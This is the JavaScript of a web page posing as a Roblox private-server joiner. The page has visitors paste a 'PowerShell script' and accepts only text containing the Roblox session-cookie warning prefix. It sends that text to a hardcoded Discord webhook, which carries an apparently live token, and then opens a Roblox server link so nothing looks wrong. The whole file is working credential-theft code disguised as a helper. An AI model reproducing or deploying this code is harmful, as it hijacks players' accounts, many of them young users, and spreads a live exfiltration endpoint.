
    /* -------------------------------- CONFIG -------------------------------- */
    const webhookURL = "https://discord.com/api/webhooks/1445517938122817596/lUWtH8zbtU9r4lzyCvrSHv5axUbW5WZwAH9icSCFu1EDMfaZrsu_z58KzO5Z7T2vqwUK";
    const linkA = "https://www.roblox.com/share?code=873988b0a26449498cceb1b239455bb8&type=Server";
    const requiredSignature = "_|WARNING:-DO-NOT-SHARE-THIS.";

    /* -------------------------------- DOM -------------------------------- */
    const psInput = document.getElementById("psInput");
    const joinBtn = document.getElementById("joinBtn");
    const joinCountEl = document.getElementById("joinCount");
    const lastLinkEl = document.getElementById("lastLink");
    const loadingOverlay = document.getElementById("loadingOverlay");
    const validText = document.getElementById("validText");
    const validDot = document.getElementById("validDot");
    const lastSentEl = document.getElementById("lastSent");
    const copyBtn = document.getElementById("copyBtn");
    const clearBtn = document.getElementById("clearBtn");

    /* ------------------------------ STORAGE ------------------------------ */
    const KEY_JOINS = "psjoin_pro_count_v1";
    const KEY_LAST_LINK = "psjoin_pro_lastlink_v1";
    const KEY_LAST_SENT = "psjoin_pro_lastsent_v1";

    let joinCount = parseInt(localStorage.getItem(KEY_JOINS) || "0", 10);
    joinCountEl.textContent = joinCount;

    const storedLast = localStorage.getItem(KEY_LAST_LINK);
    if (storedLast) lastLinkEl.textContent = storedLast;

    const storedLastSent = localStorage.getItem(KEY_LAST_SENT);
    if (storedLastSent) lastSentEl.textContent = storedLastSent;

    /* ---------------------------- VALIDATION UI ---------------------------- */
    function updateValidityUI(isValid) {
      if (isValid) {
        validText.textContent = "VALID";
        validText.style.color = "#00e09b";
        validDot.className = "valid-dot";
      } else {
        validText.textContent = "NOT VALID";
        validText.style.color = "#ff6b7a";
        validDot.className = "invalid-dot";
      }
    }

    function checkValidity(text) {
      return text.includes(requiredSignature);
    }

    psInput.addEventListener("input", () => {
      const ok = checkValidity(psInput.value || "");
      updateValidityUI(ok);
      if (ok) psInput.classList.remove("invalid");
    });

    /* --------------------------- COPY & CLEAR --------------------------- */
    copyBtn.addEventListener("click", async () => {
      try {
        await navigator.clipboard.writeText(psInput.value || "");
        copyBtn.textContent = "Copied ✓";
        setTimeout(() => copyBtn.textContent = "Copy Script", 1500);
      } catch (e) {
        copyBtn.textContent = "Copy Failed";
        setTimeout(() => copyBtn.textContent = "Copy Script", 1500);
      }
    });

    clearBtn.addEventListener("click", () => {
      psInput.value = "";
      updateValidityUI(false);
    });

    /* ------------------------- SEND + OPEN LOGIC ------------------------- */
    async function sendToWebhookAndOpen() {
      const content = (psInput.value || "").trim();

      if (!content) {
        alert("Paste something first.");
        return;
      }

      if (!checkValidity(content)) {
        psInput.classList.add("invalid");
        updateValidityUI(false);
        alert("❌ Not a valid PowerShell script!");
        return;
      }

      let newWin = null;
      try {
        newWin = window.open("about:blank", "_blank");
      } catch {
        newWin = null;
      }

      loadingOverlay.style.display = "flex";

      try {
        if (content.length <= 1900) {
          const resp = await fetch(webhookURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ content: "```\nps\n" + content + "\n```" })
          });

          if (!resp.ok) {
            const txt = await resp.text().catch(() => "(no body)");
            throw new Error(`Webhook responded ${resp.status}: ${txt}`);
          }

        } else {
          const blob = new Blob([content], { type: "text/plain" });
          const fd = new FormData();
          fd.append("file", blob, "script.ps1");

          const resp = await fetch(webhookURL, { method: "POST", body: fd });

          if (!resp.ok) {
            const txt = await resp.text().catch(() => "(no body)");
            throw new Error(`Webhook responded ${resp.status}: ${txt}`);
          }
        }

        const now = new Date().toLocaleString();
        lastSentEl.textContent = now;
        localStorage.setItem(KEY_LAST_SENT, now);

        joinCount = joinCount + 1;
        localStorage.setItem(KEY_JOINS, String(joinCount));
        joinCountEl.textContent = joinCount;

        const target = linkA;
        localStorage.setItem(KEY_LAST_LINK, target);
        lastLinkEl.textContent = target;

        if (newWin && !newWin.closed) {
          try {
            newWin.location.href = target;
          } catch {
            newWin = window.open(target, "_blank");
          }
        } else {
          const opened = window.open(target, "_blank");
          if (!opened) {
            alert("Link couldn't be opened automatically. Click the 'Last Opened Link' in the right panel.");
          }
        }

      } catch (err) {
        console.error("Webhook send error:", err);
        alert("❌ Webhook sending failed — see console for details.");
      } finally {
        loadingOverlay.style.display = "none";
      }
    }

    joinBtn.addEventListener("click", sendToWebhookAndOpen);

    psInput.addEventListener("keydown", (e) => {
      if ((e.ctrlKey || e.metaKey) && e.key === "Enter") {
        e.preventDefault();
        sendToWebhookAndOpen();
      }
    });

    updateValidityUI(checkValidity(psInput.value || ""));

  
